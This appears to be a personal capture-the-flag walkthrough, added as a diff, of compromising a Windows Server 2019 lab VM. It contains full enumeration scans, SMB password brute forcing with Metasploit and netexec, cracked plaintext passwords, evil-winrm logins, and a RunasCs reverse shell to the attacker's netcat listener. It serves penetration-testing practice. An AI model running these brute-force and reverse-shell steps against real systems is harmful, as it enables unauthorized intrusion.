@@ -1,0 +1,452 @@
+			ENUMERATION
+		
+---ifconfig---
+                                                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 251256  bytes 228322724 (217.7 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 91749  bytes 7623424 (7.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 49  bytes 7828 (7.6 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 49  bytes 7828 (7.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+---netdiscover---
+                                                                                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                                                       
+                                                                                                                                       
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960                                                                      
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor                                                                      
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor                                                                      
+ 10.0.2.3        08:00:27:36:92:8f      4     240  PCS Systemtechnik GmbH                                                              
+ 10.0.2.30       08:00:27:29:77:32      4     240  PCS Systemtechnik GmbH                                                              
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                                
+
+
+
+---target is 10.0.2.30, let's run nmap---
+                                                          
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.30 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 14:42 +03
+Nmap scan report for 10.0.2.30
+Host is up (0.00082s latency).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+MAC Address: 08:00:27:29:77:32 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Microsoft Windows 2019
+OS details: Microsoft Windows Server 2019
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-03-29T11:43:49
+|_  start_date: N/A
+|_nbstat: NetBIOS name: WIN-IURF14RBVGV, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:29:77:32 (Oracle VirtualBox virtual NIC)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.82 ms 10.0.2.30
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.96 seconds
+                  
+
+
+---we see there are smb and tcp ports open, lets go check the website---
+
+---we see a username nica, then I check the windows machine and find another user called akanksha---
+
+---I create a users.txt file and put those names in there, now lets keep looking---
+
+---lets try smblogin method, so far we know about 2 users and can try to crack their passwords with msfconsole, lets try for nica first---
+
+
+                                                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# msfconsole 
+
+
+msf6 > use auxiliary/scanner/smb/smb_login 
+
+msf6 auxiliary(scanner/smb/smb_login) > set SMBUser nica
+SMBUser => nica
+msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.0.2.30
+RHOSTS => 10.0.2.30
+
+msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /home/okina/wordlists/rockyou.txt
+PASS_FILE => /home/okina/wordlists/rockyou.txt
+
+msf6 auxiliary(scanner/smb/smb_login) > run
+
+---we use the rockyou.txt and boom, we retrieve the password for nica, hardcore---
+
+username = nica
+password = hardcore
+
+
+
+NOTE: We can also use netexec to find the passwords of this user
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/LIAR WINDOWS CTF]
+└─# netexec smb 10.0.2.30 -u 'nica' -p /home/okina/wordlists/rockyou.txt '--ignore-pw-decoding'
+
+
+
+---lets look at the smb server---
+                                                                                                                
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# smbclient -L \\\\10.0.2.30\\ -U nica        
+Password for [WORKGROUP\nica]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Admin remota
+	C$              Disk      Recurso predeterminado
+	IPC$            IPC       IPC remota
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.0.2.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+      
+
+---there is not much we can do from here---
+
+
+---there is a tool named evil-winrm which makes it very convenient for us to hack windows machines,
+and we know the username and password of nica, let's try evil-winrm---
+
+ 
+
+
+				GAINING FOOTHOLD
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# evil-winrm -i 10.0.2.30 -u nica -p hardcore                        
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\nica\Documents> dir
+*Evil-WinRM* PS C:\Users\nica\Documents> ls
+*Evil-WinRM* PS C:\Users\nica\Documents> cd ..
+*Evil-WinRM* PS C:\Users\nica> dir
+
+
+    Directorio: C:\Users\nica
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018   9:12 AM                Desktop
+d-r---        9/26/2023   6:44 PM                Documents
+d-r---        9/15/2018   9:12 AM                Downloads
+d-r---        9/15/2018   9:12 AM                Favorites
+d-r---        9/15/2018   9:12 AM                Links
+d-r---        9/15/2018   9:12 AM                Music
+d-r---        9/15/2018   9:12 AM                Pictures
+d-----        9/15/2018   9:12 AM                Saved Games
+d-r---        9/15/2018   9:12 AM                Videos
+-a----        9/26/2023   6:44 PM             10 user.txt
+
+
+*Evil-WinRM* PS C:\Users\nica> type user.txt
+---First User Flag---
+
+
+---now we are in and got our first flag--- 
+
+
+---lets look at other users, we have found user akanksha lets check the privilege of both users---
+
+
+*Evil-WinRM* PS C:\Users\nica> net user
+
+Cuentas de usuario de \\
+
+-------------------------------------------------------------------------------
+Administrador            akanksha                 DefaultAccount
+Invitado                 nica                     WDAGUtilityAccount
+El comando se ha completado con uno o m s errores.
+
+
+
+---we see the akanksha user and he has more privileges than nica, now lets try to find the password for akanksha too, come back to msfconsole---
+
+
+msf6 auxiliary(scanner/smb/smb_login) > set SMBUser akanksha
+SMBUser => akanksha
+msf6 auxiliary(scanner/smb/smb_login) > run
+
+
+---and we retrieve the password for akanksha also, it is sweetgirl---
+
+
+username = akanksha
+password = sweetgirl
+
+
+
+NOTE: now to be fair you can access the windows machine as akanksha 
+and try to find the flag there but we will continue from our machine to demonstrate an
+actual pentest.
+
+
+
+---lets use evil-winrm for this user too---
+
+
+
+			
+		
+				PRIVILEGE ESCALATION
+
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# evil-winrm -i 10.0.2.30 -u akanksha -p sweetgirl
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+                          
+---we get this error---
+
+
+
+---I searched online and looked for guides, there is a tool named RunasCs that we can use to 
+run specific processes with different permissions than the user's current login provides 
+using explicit credentials. So we can run credentials as if we are root user
+while bein akanksha for example---
+
+
+RunasCs:RunasCs is an utility to run specific processes with different permissions than 
+the user's current logon provides using explicit credentials. This tool is an 
+improved and open version of windows builtin runas.exe 
+
+
+---I downloaded the necessary github repo but the RunasCs.exe wasn't there, I found it
+in the releases page and then downloaded it into /opt/RunasCS folder---
+
+
+                                                                                                                                                 
+┌──(root㉿kali)-[/home/okina/Downloads]
+└─# cd /opt/RunasCS
+
+
+
+┌──(root㉿kali)-[/opt/RunasCs]
+└─# evil-winrm -i 10.0.2.30 -u nica -p hardcore
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\nica\Documents> cd ..
+                                        
+*Evil-WinRM* PS C:\Users\nica> upload RunasCs.exe
+                                        
+Info: Uploading /opt/RunasCs/RunasCs.exe to C:\Users\nica\RunasCs.exe
+                                        
+Data: 68948 bytes of 68948 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\nica> dir
+
+
+    Directorio: C:\Users\nica
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        9/15/2018   9:12 AM                Desktop
+d-r---        9/26/2023   6:44 PM                Documents
+d-r---        9/15/2018   9:12 AM                Downloads
+d-r---        9/15/2018   9:12 AM                Favorites
+d-r---        9/15/2018   9:12 AM                Links
+d-r---        9/15/2018   9:12 AM                Music
+d-r---        9/15/2018   9:12 AM                Pictures
+d-----        9/15/2018   9:12 AM                Saved Games
+d-r---        9/15/2018   9:12 AM                Videos
+-a----        3/29/2024   3:22 PM          51712 RunasCs.exe
+-a----        9/26/2023   6:44 PM             10 user.txt
+
+
+
+---it is uploaded, lets get it to work now and start our listener---
+             
+
+*Evil-WinRM* PS C:\Users\nica> .\RunasCs.exe akanksha sweetgirl cmd.exe -r 10.0.2.15:1234
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nc -nvlp 1234
+listening on [any] 1234 ...
+
+
+---this didnt work, so I downloaded one version earlier version of RunasCs and then it worked---
+Use the old version, it works.           
+
+
+*Evil-WinRM* PS C:\Users\nica> .\oldrunascs.exe akanksha sweetgirl cmd.exe -r 10.0.2.15:8080
+[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-68081$\Default
+[+] Async process 'cmd.exe' with pid 1104 created and left in background.
+
+
+
+┌──(root㉿kali)-[/opt/RunasCs]
+└─# nc -lnvp 8080
+listening on [any] 8080 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.30] 49687
+Microsoft Windows [Versi�n 10.0.17763.107]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+C:\Windows\system32>whoami
+whoami
+win-iurf14rbvgv\akanksha
+
+
+---we successfully logged in as akanksha, lets look around for some more clues---
+
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 26CD-AE41
+
+ Directorio de C:\Users
+
+26/09/2023  17:44    <DIR>          .
+26/09/2023  17:44    <DIR>          ..
+26/09/2023  17:36    <DIR>          Administrador
+29/03/2024  16:14    <DIR>          akanksha
+29/03/2024  18:50    <DIR>          nica
+26/09/2023  14:11    <DIR>          Public
+               0 archivos              0 bytes
+               6 dirs  45.759.086.592 bytes libres
+
+
+
+---I looked around every folder but the flag is not within the akanksha user---
+
+---lets try to navigate to Administrator, we have seen that akanksha had some privileges---
+
+
+C:\Users>dir 
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 26CD-AE41
+
+ Directorio de C:\Users
+
+26/09/2023  17:44    <DIR>          .
+26/09/2023  17:44    <DIR>          ..
+26/09/2023  17:36    <DIR>          Administrador
+29/03/2024  18:37    <DIR>          akanksha
+29/03/2024  18:50    <DIR>          nica
+26/09/2023  14:11    <DIR>          Public
+               0 archivos              0 bytes
+               6 dirs  45.759.086.592 bytes libres
+
+C:\Users>cd Administrador
+cd Administrador
+
+C:\Users\Administrador>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 26CD-AE41
+
+ Directorio de C:\Users\Administrador
+
+26/09/2023  17:36    <DIR>          .
+26/09/2023  17:36    <DIR>          ..
+26/09/2023  14:11    <DIR>          3D Objects
+26/09/2023  14:11    <DIR>          Contacts
+26/09/2023  14:11    <DIR>          Desktop
+26/09/2023  14:11    <DIR>          Documents
+26/09/2023  14:11    <DIR>          Downloads
+26/09/2023  14:11    <DIR>          Favorites
+26/09/2023  14:11    <DIR>          Links
+26/09/2023  14:11    <DIR>          Music
+26/09/2023  14:24            16.418 new.cfg
+26/09/2023  14:11    <DIR>          Pictures
+26/09/2023  17:36                13 root.txt
+26/09/2023  14:11    <DIR>          Saved Games
+26/09/2023  14:11    <DIR>          Searches
+26/09/2023  14:11    <DIR>          Videos
+               2 archivos         16.431 bytes
+              14 dirs  45.758.955.520 bytes libres
+
+
+---we see the root.txt, lets see if the user akanksha can read it--- 
+
+C:\Users\Administrador>type root.txt
+type root.txt
+---Root User Flag---
+
+---yes he can :) ---
+
+
